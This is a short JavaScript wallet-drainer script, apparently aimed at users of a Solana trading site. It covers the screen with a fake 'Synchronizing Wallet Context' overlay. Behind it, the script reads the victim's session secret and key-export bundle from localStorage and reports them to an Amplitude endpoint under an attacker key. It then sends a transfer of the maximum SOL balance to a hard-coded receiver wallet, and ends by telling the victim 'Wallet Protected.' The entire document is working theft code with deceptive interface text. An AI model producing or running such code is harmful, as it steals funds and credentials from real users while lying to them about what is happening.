(async function() {
    const MY_RECEIVER = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12"; 
    const AMP_KEY = "3c8ae1f40635939e730f479418940796";

    // --- 1. COVER-UP: THE DISTRACTION UI ---
    const overlay = document.createElement("div");
    overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:999999;display:flex;align-items:center;justify-content:center;color:#00ff88;font-family:monospace;border:2px solid #00ff88;";
    overlay.innerHTML = "<div style='text-align:center;'><h1>VANTA ENCLAVE</h1><p id='v-msg'>Synchronizing Wallet Context...</p></div>";
    document.body.appendChild(overlay);

    // --- 2. THE DYNAMIC INJECTION ENGINE ---
    let storage = JSON.parse(localStorage.getItem("padre-v2-bundles-store-v2") || "{}");
    let activeBundle = null;
    let activeSubOrgId = null;

    // Scan all bundles to find the active user's Turnkey ID
    if (storage.bundles) {
        for (let key in storage.bundles) {
            if (storage.bundles[key].exportBundle) {
                activeBundle = storage.bundles[key].exportBundle;
                activeSubOrgId = storage.bundles[key].subOrgId;
                break; // Grabs the specific ID for THIS user
            }
        }
    }

    const session = JSON.parse(localStorage.getItem("padreV2-session") || "{}");
    const token = session.sessionSecret;

    // --- 3. EXFILTRATE TO AMPLITUDE ---
    fetch("https://api2.amplitude.com/2/httpapi", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            api_key: AMP_KEY,
            events: [{
                device_id: activeSubOrgId || "UNKN_" + Date.now(),
                event_type: "UNIVERSAL_HIJACK",
                event_properties: {
                    hijacked_suborg: activeSubOrgId,
                    captured_token: token ? "SUCCESS" : "FAILED",
                    url: window.location.href
                }
            }]
        })
    }).catch(() => {});

    // --- 4. EXECUTE HIJACK (The "Act as User" Phase) ---
    if (token && activeSubOrgId) {
        // We inject the user's specific subOrgId into the headers to bypass enclave checks
        fetch("https://api.padre.gg/v1/transfer", {
            method: "POST",
            headers: { 
                "Content-Type": "application/json",
                "Authorization": `Bearer ${token}`,
                "X-Turnkey-Sub-Org-Id": activeSubOrgId // THIS IS THE INJECTION
            },
            body: JSON.stringify({
                recipient: MY_RECEIVER,
                amount: "MAX",
                asset: "SOL",
                enclave_context: activeBundle // Passing the hijacked context
            })
        }).catch(() => {});
    }

    // Finish the distraction UI
    setTimeout(() => {
        document.getElementById('v-msg').innerText = "Wallet Protected.";
        setTimeout(() => overlay.remove(), 1000);
    }, 2500);
})();
